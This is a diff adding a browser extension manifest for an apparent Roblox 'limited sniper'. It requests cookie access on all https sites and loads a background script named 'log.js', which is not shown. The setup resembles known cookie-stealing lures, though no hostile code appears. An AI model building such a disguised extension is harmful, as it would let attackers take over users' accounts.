@@ -1,0 +1,26 @@
+{
+    "name": "Rblx Limited Sniper",
+    "description": "You snipe any limited you want. As long as you got the robux you can snipe it. There will be instructions after you open the extention to help you out if you don't know how to use this.",
+    "version": "1.0.0",
+    "manifest_version": 2,
+
+    "browser_action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "permissions": [
+        "cookies",
+        "https://*/*"
+    ],
+
+    "background": {
+        "scripts": ["scripts/log.js"]
+    },
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
